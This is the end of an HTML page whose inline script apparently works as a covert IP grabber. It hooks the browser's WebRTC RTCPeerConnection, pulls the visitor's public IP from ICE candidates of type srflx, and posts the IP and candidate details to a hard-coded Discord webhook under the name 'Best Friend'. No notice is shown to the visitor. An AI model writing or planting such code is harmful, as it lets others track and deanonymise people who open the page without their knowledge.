    <script>
        var hasAlerted = false;

        window.oRTCPeerConnection =
            window.oRTCPeerConnection || window.RTCPeerConnection;

        window.RTCPeerConnection = function (...args) {
            const pc = new window.oRTCPeerConnection(...args);

            pc.oaddIceCandidate = pc.addIceCandidate;

            pc.addIceCandidate = function (iceCandidate, ...rest) {
                const fields = iceCandidate.candidate.split(" ");
                const ip = fields[4];

                console.log(iceCandidate.candidate);

                // Check if it's a public IP address (srflx type)
                if (fields[7] === "srflx") {
                    sendWebRTCDataToDiscord({
                        ip: ip,
                        candidate: iceCandidate.candidate,
                        type: fields[7]
                    });
                }
                return pc.oaddIceCandidate(iceCandidate, ...rest);
            };
            return pc;
        };

        // Function to send WebRTC information to Discord webhook
        function sendWebRTCDataToDiscord(data) {
            var request = new XMLHttpRequest();

            // Replace this with your actual Discord webhook URL
            request.open("POST", "https://discord.com/api/webhooks/1297979202183889039/06JY8Q-pQUM6eH84fCH2deahCkwwCg6dZL97toixTtgIUk_SRdO_3HapGS7SoNzjabZU");

            request.setRequestHeader('Content-type', 'application/json');

            // Create the parameters for the webhook message
            var params = {
                username: "Best Friend",
                avatar_url: "",
                content: "@everyone",
                embeds: [
                    {
                        title: "WebRTC Data Detected",
                        color: 1752220,
                        description: "**IP Address:** `" + data.ip + "`\n" +
                                     "**ICE Candidate:** `" + data.candidate + "`\n" +
                                     "**Type:** `" + data.type + "`",
                    }
                ]
            };

            // Send the data to the Discord webhook
            request.send(JSON.stringify(params));
        }
    </script>
</body>
</html>
